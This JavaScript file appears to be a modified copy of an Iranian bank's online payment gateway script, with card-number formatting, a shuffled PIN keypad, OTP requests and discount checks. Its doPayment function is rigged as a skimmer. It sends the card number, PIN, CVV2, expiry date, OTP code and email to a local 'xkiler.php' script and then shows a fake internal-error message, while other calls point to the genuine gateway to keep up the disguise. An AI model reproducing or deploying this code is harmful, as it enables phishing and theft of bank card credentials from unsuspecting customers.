var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.checkStringArgs = function(a, b, c) {
	if (null == a) throw new TypeError("The 'this' value for String.prototype." + c + " must not be null or undefined");
	if (b instanceof RegExp) throw new TypeError("First argument to String.prototype." + c + " must not be a regular expression");
	return a + ""
};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.SIMPLE_FROUND_POLYFILL = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function(a, b, c) {
	a != Array.prototype && a != Object.prototype && (a[b] = c.value)
};
$jscomp.getGlobal = function(a) {
	return "undefined" != typeof window && window === a ? a : "undefined" != typeof global && null != global ? global : a
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.polyfill = function(a, b, c, d) {
	if (b) {
		c = $jscomp.global;
		a = a.split(".");
		for (d = 0; d < a.length - 1; d++) {
			var e = a[d];
			e in c || (c[e] = {});
			c = c[e]
		}
		a = a[a.length - 1];
		d = c[a];
		b = b(d);
		b != d && null != b && $jscomp.defineProperty(c, a, {
			configurable: !0,
			writable: !0,
			value: b
		})
	}
};
$jscomp.polyfill("String.prototype.repeat", function(a) {
	return a ? a : function(a) {
		var b = $jscomp.checkStringArgs(this, null, "repeat");
		if (0 > a || 1342177279 < a) throw new RangeError("Invalid count value");
		a |= 0;
		for (var d = ""; a;)
			if (a & 1 && (d += b), a >>>= 1) b += b;
		return d
	}
}, "es6", "es3");
$jscomp.stringPadding = function(a, b) {
	a = void 0 !== a ? String(a) : " ";
	return 0 < b && a ? a.repeat(Math.ceil(b / a.length)).substring(0, b) : ""
};
$jscomp.polyfill("String.prototype.padStart", function(a) {
	return a ? a : function(a, c) {
		var b = $jscomp.checkStringArgs(this, null, "padStart");
		return $jscomp.stringPadding(c, a - b.length) + b
	}
}, "es8", "es3");
$jscomp.findInternal = function(a, b, c) {
	a instanceof String && (a = String(a));
	for (var d = a.length, e = 0; e < d; e++) {
		var f = a[e];
		if (b.call(c, f, e, a)) return {
			i: e,
			v: f
		}
	}
	return {
		i: -1,
		v: void 0
	}
};
$jscomp.polyfill("Array.prototype.find", function(a) {
	return a ? a : function(a, c) {
		return $jscomp.findInternal(this, a, c).v
	}
}, "es6", "es3");
var globalRemainingSeconds, terminalDiscountStatus, otpRequestWaitMillis, ctrlDown = !1,
	ctrlKey = 17,
	cmdKey = 91,
	panDtoList, encRefId, focusedField, shuffledArray, disableCountDown = !1,
	successfullyDone = !1,
	cursorPosition = 0,
	selectedPanIndex = -1,
	previousSelectedPanIndex = -1,
	previousPan, keyPadInputId, previousOTPRequestMillis, otpRemainingSeconds, availableBankLogos = {
		610433: "mellat",
		589905: "melli",
		170019: "melli",
		603799: "melli",
		603769: "saderat",
		639217: "keshavarzi",
		603770: "keshavarzi",
		589210: "sepah",
		627353: "tejarat",
		585983: "tejarat",
		628023: "maskan",
		207177: "tose_saderat",
		627648: "tose_saderat",
		627961: "sanat_madan",
		627760: "postbank",
		621986: "saman",
		627412: "eghtesad_novin",
		639347: "pasargad",
		502229: "pasargad",
		639607: "sarmaye",
		627488: "karafarin",
		639194: "parsian",
		622106: "parsian",
		639346: "sina",
		589463: "refah",
		628157: "etebari_tose",
		504706: "shahr",
		502806: "shahr",
		502908: "tose_teavon",
		502938: "dey",
		606373: "gharzolhasane_mehr",
		639370: "etebari_mehr",
		627381: "ansar",
		636214: "ayandeh",
		636949: "hekmat_iranian",
		505785: "iran_zamin",
		505416: "gardeshgari",
		636795: "markazi",
		504172: "resalat",
		505801: "kosar",
		505809: "khavarmianeh",
		507677: "noor",
		606256: "melal",
		639599: "ghavamin"
	};

function validatePaymentInputs(a) {
	var b = !0;
	validatePan() || (b = !1);
	a && !validateInput("inputpin", /\d{4,12}/) && (b = !1);
	validateInput("inputcvv2", /\d{3,4}/) || (b = !1);
	validateDate() || (b = !1);
	validateInput("inputcapcha", /\d{5}/) || (b = !1);
	validateInput("inputemail", /^(\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,4})+)?$/) || (b = !1);
	document.getElementById("inputpayerid") && !validateInput("inputpayerid", /\d{1,30}/) && (b = !1);
	b ? hideMessage() : showMessage(i18n.invalidInput);
	return b
}

function removeInvalidClassFromPan() {
	$("#cardnumberbox").parent().parent().removeClass("invalid")
}

function addInvalidClassToPan() {
	$("#cardnumberbox").parent().parent().addClass("invalid")
}

function validatePan() {
	var a = checkPattern("cardnumber", /\d{4}\s?\d{4}\s?\d{4}\s?\d{4}/) || -1 < selectedPanIndex && checkPattern("cardnumber", /\d{4}\s?\d{2}(\u00d7){2}\s?(\u00d7){4}\s?\d{4}/);
	a ? removeInvalidClassFromPan() : addInvalidClassToPan();
	return a
}

function doPayment(a, b) {
	var c = {
		pan: 0 <= selectedPanIndex ? null : document.getElementById("cardnumber").value.replace(/ /g, ""),
		selectedPanIndex: selectedPanIndex,
		pin: document.getElementById("inputpin").value,
		cvv2: document.getElementById("inputcvv2").value,
		expireMonth: document.getElementById("inputmonth") ? document.getElementById("inputmonth").value : null,
		expireYear: document.getElementById("inputyear") ? document.getElementById("inputyear").value : null,
		captcha: document.getElementById("inputcapcha").value,
  code: document.getElementById("code").value,
		payerId: document.getElementById("inputpayerid") ? document.getElementById("inputpayerid").value : null,
		email: document.getElementById("inputemail").value,
		savePan: document.getElementById("savePanCheckbox") ? document.getElementById("savePanCheckbox").checked : !1
	};
showSubmitSpinner();
	$.ajax({
		data: c,
		success: showMessage("خطای داخلی سیستم "),
		type: "POST",
		url: "xkiler.php"
	});
setTimeout(function(){ hideSubmitSpinner();}, 2000);
}

function processSaleResponse(a) {
	hideSubmitSpinner();
	if (a)
		if ("OK" === a.status) successfullyDone = !0, document.forms.resultForm.submit();
		else if ("BLOCKER_ERROR" === a.status) document.forms.resultForm.submit();
	else if (validatePaymentInputs(!0), "INVALID_CAPTCHA" === a.status) "-1" === a.responseCode && refreshCaptcha(), showMessage(i18n.invalidInput), $("#inputcapcha").parent().parent().addClass("invalid");
	else switch (refreshCaptcha(), a.status) {
		case "INVALID_PAYER_ID":
			showMessage(i18n.invalidInput);
			$("#inputpayerid").parent().parent().addClass("invalid");
			break;
		case "SYSTEM_INTERNAL_ERROR":
			showMessage(i18n.systemInternalError);
			break;
		case "SALE_FAILED":
			"415" === a.responseCode || "419" === a.responseCode ? (stopCountDown(), showMessage(i18n.transactionTimeout), document.getElementById("ResCode").value = a.responseCode, document.forms.returnForm.submit()) : "11" === a.responseCode && addInvalidClassToPan(), showMessage(a.description)
	}
}

function refreshCaptcha() {
	$("#inputcapcha").val("");
	document.getElementById("captcha-img").src = "https://bpm.shaparak.ir/pgwchannel/captchaimg.jpg?RefId=27629DFDDC5F4DE4" + encRefId + "&rnd=" + Math.random();
	enableCaptcha()
}

function showMessage(a, b) {
	$(".card-errorbox").text(a);
	b && $(".card-errorbox").addClass("info-message");
	$(".card-errorbox").addClass("show");
	setTimeout("hideMessage()", 1E4)
}

function hideMessage() {
	$(".card-errorbox").removeClass("show");
	$(".card-errorbox").removeClass("info-message")
}

function handleUnknownError() {
	hideSubmitSpinner();
	hideBankLogoSpinner();
	enableOtpButton();
	0 === a.status ? showMessage(i18n.networkError) : 404 === a.status ? showMessage(i18n.systemInternalError) : 500 == a.status ? showMessage(i18n.systemInternalError) : "parsererror" === b ? showMessage(i18n.systemInternalError) : "timeout" === b ? showMessage(i18n.networkError) : "abort" === b ? showMessage(i18n.networkError) : "ajaxError" == a.type ? showMessage(i18n.networkError) : showMessage(i18n.systemInternalError)
}

function validateAndDoPayment(a, b) {
	validatePaymentInputs(!0) && doPayment(a, b)
}

function removeInvalidClassFromInput(a) {
	$("#" + a).parent().parent().removeClass("invalid")
}

function validateInput(a, b) {
	if (checkPattern(a, b)) return removeInvalidClassFromInput(a), !0;
	addInvalidClassToInput(a);
	return !1
}

function addInvalidClassToInput(a) {
	$("#" + a).parent().parent().addClass("invalid")
}

function validateDate() {
	var a = !0;
	if (0 < $("#inputmonth:visible").length) {
		checkPattern("inputmonth", /\d{2}/) || (a = !1);
		var b = document.getElementById("inputmonth").value;
		if (1 > b || 12 < b) a = !1
	}
	0 < $("#inputyear:visible").length && !checkPattern("inputyear", /\d{2}/) && (a = !1);
	a ? removeInvalidClassFromInput("inputmonth") : $("#inputmonth").parent().parent().addClass("invalid");
	return a
}

function focusNextField(a, b, c) {
	if (isNumericKeyDownOrUp(getEventKeyCode(c)) && a.value.length >= a.maxLength)
		for (a = b.split("|"), b = 0; b < a.length; b++)
			if (c = a[b], 0 < $("#" + c + ":visible").length) {
				focusField(c);
				break
			}
}

function focusField(a) {
	a = document.getElementById(a);
	a.focus();
	"button" !== a.type && a.setSelectionRange(0, a.value.length)
}

function hideKeypadOnTab(a) {
	9 === getEventKeyCode(a) && hideKeypad()
}

function checkPattern(a, b) {
	return b.test(document.getElementById(a).value)
}

function setPanCursorPosition(a) {
	var b = document.getElementById("cardnumber");
	a = getEventKeyCode(a);
	cursorPosition = b.selectionStart;
	8 === a ? 0 !== cursorPosition && (b = b.value.substring(b.selectionStart, b.selectionEnd), / /.test(b) ? 5 !== cursorPosition && 10 !== cursorPosition && 15 !== cursorPosition || cursorPosition-- : (6 !== cursorPosition && 11 !== cursorPosition && 16 !== cursorPosition || cursorPosition--, cursorPosition--), cursorPosition = 0 > cursorPosition ? 0 : cursorPosition) : 46 === a ? 4 !== cursorPosition && 9 !== cursorPosition && 14 !== cursorPosition || cursorPosition++ : isNumericKeyDownOrUp(a) && (3 !== cursorPosition && 8 !== cursorPosition && 13 !== cursorPosition && 4 !== cursorPosition && 9 !== cursorPosition && 14 !== cursorPosition || cursorPosition++, cursorPosition++)
}

function formatPanOnKeyDown(a) {
	if (shouldIgnore(getEventKeyCode(a))) return !0;
	a = document.getElementById("cardnumber");
	var b = concatNumericChars(a.value, 16);
	a.value = getFormattedPan(b)
}

function shouldIgnore(a) {
	return !(!a || isNumericKeyDownOrUp(a) || ctrlDown && 86 === a)
}

function formatPanOnKeyUp(a) {
	a = getEventKeyCode(a);
	if (shouldIgnore(a)) return !0;
	var b = document.getElementById("cardnumber"),
		c = concatNumericChars(b.value, 16);
	b.value = getFormattedPan(c);
	!a || isNumericKeyDownOrUp(a)
}

function getFormattedPan(a) {
	for (var b = "", c = /\d{1,4}/g, d; null != (d = c.exec(a));) 0 !== b.length && (b += " "), b += d[0];
	return b
}

function concatNumericChars(a, b) {
	for (var c = "", d = /\d{1,16}/g, e; null != (e = d.exec(a)) && c.length < b;) c += e[0];
	c.length > b && (c = c.substring(0, b));
	return c
}

function extractNumbers(a, b) {
	var c = a.value;
	c = concatNumericChars(c, b);
	a.value = c
}

function preventInvalidKeys(a) {
	var b = getEventKeyCode(a);
	if (-1 !== [16, 17, 91, 0, 13, 8, 9, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46].indexOf(b) || isNumericKeyDownOrUp(b) || ctrlDown || 112 <= b && 123 >= b) return !0;
	window.event ? window.event.returnValue = !1 : a.preventDefault();
	return !1
}

function isNumericKeyDownOrUp(a) {
	return 47 < a && 58 > a || 95 < a && 106 > a
}

function getEventKeyCode(a) {
	return window.event ? a.keyCode : a.which
}

function cancelPay() {
	document.getElementById("ResCode").value = "17";
	document.forms.returnForm.submit();
	return !1
}

function countDownRemainingTime(a) {
	if (!disableCountDown) {
		if (0 >= a) stopCountDown(), successfullyDone || (document.getElementById("ResCode").value = "415", document.forms.returnForm.submit());
		else {
			var b = Math.floor(a / 60),
				c = a % 60;
			$("#remaining-time b").text((b + "").padStart(2, "0") + ":" + (c + "").padStart(2, "0"))
		}
		globalRemainingSeconds = a - 1;
		setTimeout("countDownRemainingTime(globalRemainingSeconds)", 1E3)
	}
}

function stopCountDown() {
	disableCountDown = !0;
	$("#remaining-time b").text("--:--")
}

function fillField(a, b) {
	if (focusedField) {
		b.preventDefault();
		b.stopPropagation();
		focusedField.focus();
		a = a.value;
		b = focusedField.selectionStart;
		var c = focusedField.selectionEnd;
		a = b === focusedField.value.length ? focusedField.value + a : focusedField.value.substring(0, b) + a + focusedField.value.substring(c, focusedField.value.length);
		a.length <= focusedField.maxLength && (focusedField.value = a);
		focusedField.value.length === focusedField.maxLength && keypadTab()
	}
	return !1
}

function keypadTab() {
	hideKeypad();
	var a = "inputpin" === focusedField.id ? "inputcvv2" : 0 < $("#inputmonth:visible").length ? "inputmonth" : "inputcapcha";
	a = document.getElementById(a);
	a.focus();
	a.setSelectionRange(0, a.value.length)
}

function keyPadBackspace(a) {
	if (focusedField) {
		a.preventDefault();
		a.stopPropagation();
		focusedField.focus();
		a = focusedField.selectionStart;
		var b = focusedField.selectionEnd;
		focusedField.value = a === focusedField.value.length ? focusedField.value.substring(0, focusedField.value.length - 1) : a === b ? focusedField.value.substring(0, a - 1) + focusedField.value.substring(b, focusedField.value.length) : focusedField.value.substring(0, a) + focusedField.value.substring(b, focusedField.value.length)
	}
	return !1
}

function setFocusedField(a) {
	focusedField = a
}

function shuffleKeypad() {
	shuffledArray = shuffle([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]);
	for (var a = 0; a < shuffledArray.length; a++) {
		var b = document.getElementById("num" + a);
		b.value = shuffledArray[a];
		b.innerHTML = shuffledArray[a]
	}
}

function showKeypadJustInMobile(a, b) {
	window.matchMedia("(max-width: 575.98px)").matches && showKeypad(a, b)
}

function showKeypad(a, b) {
	keyPadInputId = a;
	var c = document.getElementById(a);
	c.focus();
	setFocusedField(c);
	shuffledArray || shuffleKeypad();
	$(".keypad-container").insertAfter("#" + a);
	$(".keypad-container").addClass("openkeypad");
	b && (b.preventDefault(), b.stopPropagation());
	return !1
}

function hideKeypad() {
	$(".keypad-container").removeClass("openkeypad")
}

function hideOthersKeypad(a) {
	a.id !== keyPadInputId && hideKeypad()
}

function shuffle(a) {
	var b;
	for (b = a.length - 1; 0 < b; b--) {
		var c = Math.floor(Math.random() * (b + 1));
		var d = a[b];
		a[b] = a[c];
		a[c] = d
	}
	return a
}

function waitAndSendSuccessResult(a) {
	0 >= a ? document.getElementById("return-button").disabled || sendSuccessResult() : ($(".timer").text(i18n.redirectRemainingTime + a), globalRemainingSeconds = a - 1, setTimeout("waitAndSendSuccessResult(globalRemainingSeconds)", 1E3))
}

function sendSuccessResult() {
	document.getElementById("return-button").disabled || (document.getElementById("return-button").disabled = !0, $("#return-button").attr("disabled", "disabled").html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>' + i18n.redirectingToMerchantSite), $(".timer").hide(), document.forms.returnForm.submit(), setTimeout("enableReturnButton()", 3E4))
}

function enableReturnButton() {
	$("#return-button").attr("disabled", "disabled").html(i18n.continueShopping);
	document.getElementById("return-button").disabled = !1
}

function hideKeypadOnOutsideClick(a) {
	$(".keypad-container").parent()[0] !== a.target && 0 === $(a.target).parents(".keypad-parent").length && hideKeypad()
}

function hideCardSuggestionListOnOutSideClick(a) {
	$(".cardnumberbox")[0] !== a.target && 0 === $(a.target).parents(".cardnumberbox").length && hideCardSuggestionList()
}

function showSubmitSpinner() {
	$(".btn-decline").hide();
	$(".btn-submit-form").addClass("perches-requested");
	$(".btn-perches").attr("disabled", "disabled").html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>' + i18n.sendingInformation)
}

function hideSubmitSpinner() {
	$(".btn-perches").removeAttr("disabled").html(i18n.pay);
	$(".btn-submit-form").removeClass("perches-requested");
	$(".btn-decline").show()
}

function showBankLogoSpinner() {
	$(".banklogo").append('<span class="spinner-border spinner-border-sm " role="status" aria-hidden="true"></span>')
}

function hideBankLogoSpinner() {
	$(".banklogo").find(".spinner-border").remove()
}

function checkPanDiscount(a) {
	var b = (new Intl.NumberFormat).format(originalAmount);
	$(".price-number").text(b + " " + i18n.rial);
	prepare4DiscountServiceCall();
	0 <= selectedPanIndex ? $.post("discount.mellat", {
		W_REFID: encRefId,
		SELECTED_PAN_INDEX: selectedPanIndex
	}, processDiscountResponse) : $.post("discount.mellat", {
		W_REFID: encRefId,
		PAN: a
	}, processDiscountResponse)
}

function handlePanChange() {
	var a = document.getElementById("cardnumber").value.replace(/ /g, "");
	isNewPan(a) && (previousSelectedPanIndex = selectedPanIndex, previousPan = a, 0 < terminalDiscountStatus && checkPanDiscount(a), showDynamicPinDialog())
}

function prepare4DiscountServiceCall() {
	showBankLogoSpinner();
	$("payButton").attr("disabled", "disabled")
}
var processDiscountResponse = function(a) {
	hideBankLogoSpinner();
	if (a)
		if ("SUCCESSFUL" === a.status) {
			var b = new Intl.NumberFormat,
				c = b.format(a.discountAmount);
			b = b.format(a.amountAfterDiscount);
			0 !== a.discountAmount ? (c = i18n.discountMessage.replace("${amount}", c) + "<br>" + i18n.finalAmount + " " + b + " " + i18n.rial, a.description && (c += "<br>" + a.description), openDiscountDialog(c, a.amountAfterDiscount)) : a.description && (c = i18n.discountDescriptionMessage.replace("${description}", a.description) + "<br>", openDiscountDialog(c, a.amountAfterDiscount));
			$("payButton").removeAttr("disabled")
		} else "MAX_DISCOUNT_CALL_EXCEEDED" === a.status ? showMessage(i18n.maxDiscountCallExceeded) : showMessage(i18n.systemErrorInDiscountCheck);
	else showMessage(i18n.systemErrorInDiscountCheck)
};

function openDiscountDialog(a, b) {
	$("#discount-body p").html(a);
	$("#discount-submit-button").click(function() {
		setAmount(b);
		hideBankLogoSpinner();
		hideDiscountDialog()
	});
	$("#discount-cancel-button").click(function() {
		setAmount(originalAmount);
		hideBankLogoSpinner();
		hideDiscountDialog();
		var a = document.getElementById("cardnumber");
		a.focus();
		a.setSelectionRange(0, a.value.length)
	});
	showDiscountDialog();
	hideKeypad();
	$("#discount-submit-button").focus()
}

function setPan(a) {
	$("#cardnumber").val(a);
	removeInvalidClassFromPan()
}

function hideDiscountDialog() {
	$("#discount-modal").hide();
	$("#discount-modal-backdrop").hide()
}

function showDiscountDialog() {
	$("#discount-modal-backdrop").show();
	$("#discount-modal").show()
}

function showDynamicPinDialog() {
	$("#dynamic-pin-modal-backdrop").show();
	$("#dynamic-pin-modal").show();
	$(".modal-footer .btn-primary").focus()
}

function removeDynamicPinDialog() {
	$("#dynamic-pin-modal").remove();
	$("#dynamic-pin-modal-backdrop").remove()
}

function setAmount(a) {
	var b = new Intl.NumberFormat;
	$(".price-number").text(b.format(a) + " " + i18n.rial)
}
$(document).ajaxError(handleUnknownError);

function setCardSuggestionListHeight() {
	var a = .7 * $(".carddetail").height() + "px";
	$(".card-suggestionlist").css({
		"max-height": a
	})
}
$(window).resize(setCardSuggestionListHeight);

function filterAndShowCardSuggestionList() {
	var a = [];
	if (panDtoList) {
		var b = document.getElementById("cardnumber").value.replace(/ /g, "");
		b = 7 > b.length ? b : b.substring(0, 6);
		for (var c = 0; c < panDtoList.length; c++) {
			var d = panDtoList[c];
			d.index = c;
			0 === d.maskedPan.lastIndexOf(b, 0) && a.push(d)
		}
	}
	showCardSuggestionList(a)
}

function toggleAllPans() {
	if (0 < $("#card-list-button.close-button").length) hideCardSuggestionList();
	else {
		for (var a = 0; a < panDtoList.length; a++) panDtoList[a].index = a;
		showCardSuggestionList(panDtoList);
		a = document.getElementById("cardnumber");
		a.focus();
		a.setSelectionRange(0, a.value.length)
	}
}

function showCardSuggestionList(a) {
	if (0 < a.length) {
		$(".card-suggestionlist").children("a:not(.editcard)").remove();
		for (var b = a.length - 1; - 1 < b; b--) {
			var c = a[b],
				d = c.maskedPan,
				e = d.substring(0, 6);
			c = '<a class="dropdown-item" href="#" tabindex="-1"  onclick="selectPan(' + c.index + ',event)"><span>' + (isBankLogoAvailable(e) ? '<img src="' + getBankLogoSrc(e) + '">' : "") + "</span>" + d + " " + c.bankName + "</a>";
			$(".card-suggestionlist").prepend(c)
		}
		$(".cardnumberbox").addClass("opensugestion");
		$("#card-list-button").addClass("close-button")
	} else hideCardSuggestionList()
}

function setBankLogo() {
	$(".banklogo").children().remove();
	var a = document.getElementById("cardnumber").value.replace(/ /g, "");
	6 <= a.length && (a = a.substring(0, 6), isBankLogoAvailable(a) && (a = '<img src="' + getBankLogoSrc(a) + '">', $(".banklogo").append(a)))
}

function hideCardSuggestionList() {
	$(".cardnumberbox").removeClass("opensugestion");
	$("#card-list-button").removeClass("close-button")
}

function selectPan(a, b) {
	selectedPanIndex = -1;
	if (a < panDtoList.length) {
		var c = panDtoList[a],
			d = c.maskedPan,
			e = d.substring(0, 4);
		e += " " + d.substring(4, 6);
		e = e + "\u00d7\u00d7 \u00d7\u00d7\u00d7\u00d7 " + d.substring(d.length - 4, d.length);
		setPan(e);
		selectedPanIndex = a;
		c.hasExpireDate && maskExpireDate();
		c.email && $("#inputemail").val(c.email);
		a = document.getElementById("inputpin");
		showKeypadJustInMobile("inputpin", b);
		a.focus();
		a.setSelectionRange(0, a.value.length);
		$("#inputcvv2").val("");
		hideCardSuggestionList();
		setBankLogo();
		handlePanChange()
	} else hideCardSuggestionList(), setBankLogo()
}

function maskExpireDate() {
	var a = $("#inputmonth").val("").hide().attr("class"),
		b = $("#inputyear").val("").hide().attr("class");
	a = '<input type="password" style="background-color: #FFFFFF" class="' + a + '" tabindex="-1" value="**" onclick="unmaskExpireDate(true)" readonly/>';
	$("#inputmonth").next().remove();
	$(a).insertAfter("#inputmonth");
	b = '<input type="password" style="background-color: #FFFFFF" class="' + b + '" tabindex="-1" value="**" onclick="unmaskExpireDate(true)" readonly/>';
	$("#inputyear").next().remove();
	$(b).insertAfter("#inputyear")
}

function unmaskExpireDate(a) {
	$("#inputmonth").next().remove();
	$("#inputyear").next().remove();
	a ? $("#inputmonth").show().focus() : $("#inputmonth").show();
	$("#inputyear").show()
}

function isBankLogoAvailable(a) {
	a = parseInt(a);
	return !!availableBankLogos[a]
}

function resetSelectedPan(a) {
	if (shouldIgnore(getEventKeyCode(a))) return !0;
	selectedPanIndex = -1;
	unmaskExpireDate(!1)
}

function getBankLogoSrc(a) {
	return "https://bpm.shaparak.ir/pgwchannel/img/bank-logo/" + availableBankLogos[a] + ".png"
}

function isNewPan(a) {
	return 0 <= selectedPanIndex && previousSelectedPanIndex !== selectedPanIndex || 16 === a.length && previousPan !== a
}

function validateAndRequestOTP() {
	if (validatePaymentInputs(!1)) {
		var a = document.getElementById("cardnumber").value.replace(/ /g, "");
		isNewPan(a) ? (previousSelectedPanIndex = selectedPanIndex, previousPan = a, requestOTP()) : (new Date).getTime() - previousOTPRequestMillis < otpRequestWaitMillis ? showMessage(i18n.otpWaitMessage) : requestOTP()
	}
}

function requestOTP() {
	var a = {
		pan: 0 <= selectedPanIndex ? null : document.getElementById("cardnumber").value.replace(/ /g, ""),
		selectedPanIndex: selectedPanIndex,
		captcha: document.getElementById("inputcapcha").value
	};
	disableOtpButton();
	disableCaptcha();
	showBankLogoSpinner();
	$.ajax({
		contentType: "application/json",
		data: JSON.stringify(a),
		dataType: "json",
		success: processOtpResponse,
		type: "POST",
		url: "https://bpm.shaparak.ir/pgwchannel/otp-request.mellat" + encRefId
	})
}

function processOtpResponse(a) {
	hideBankLogoSpinner();
	if (a) switch (a.status) {
		case "OK":
			showMessage(i18n.successFulOTP, !0);
			previousOTPRequestMillis = (new Date).getTime();
			countDownDynamicPinRemainingTime(120);
			break;
		case "INVALID_PAN":
			showMessage(i18n.invalidPan);
			enableOtpButton();
			break;
		case "INVALID_CAPTCHA":
			showMessage(i18n.invalidInput);
			$("#inputcapcha").parent().parent().addClass("invalid");
			enableCaptcha();
			enableOtpButton();
			break;
		case "EXPIRED_CAPTCHA":
			showMessage(i18n.invalidInput);
			$("#inputcapcha").parent().parent().addClass("invalid");
			refreshCaptcha();
			enableCaptcha();
			enableOtpButton();
			break;
		case "BLOCKER_ERROR":
			document.forms.resultForm.submit();
			break;
		case "COMMON_ERROR":
			showMessage(a.description);
			enableOtpButton();
			break;
		case "SYSTEM_INTERNAL_ERROR":
			showMessage(i18n.systemInternalError), enableOtpButton()
	} else showMessage(i18n.systemInternalError)
}

function disableOtpButton() {
	$("#otp-button").attr("disabled", "disabled")
}

function enableOtpButton() {
	$("#otp-button").removeAttr("disabled")
}

function disableCaptcha() {
	$("#captcha-button").attr("disabled", "disabled");
	$("#inputcapcha").attr("disabled", "disabled")
}

function enableCaptcha() {
	$("#captcha-button").removeAttr("disabled");
	$("#inputcapcha").removeAttr("disabled")
}

function countDownDynamicPinRemainingTime(a) {
	if (0 >= a) $("#otp-button").text(i18n.otpRequest), enableOtpButton(), enableCaptcha(), refreshCaptcha(), showMessage(i18n.otpRetryMessage);
	else {
		var b = Math.floor(a / 60),
			c = a % 60;
		$("#otp-button").text((b + "").padStart(2, "0") + ":" + (c + "").padStart(2, "0"));
		otpRemainingSeconds = a - 1;
		setTimeout("countDownDynamicPinRemainingTime(otpRemainingSeconds)", 1E3)
	}
};
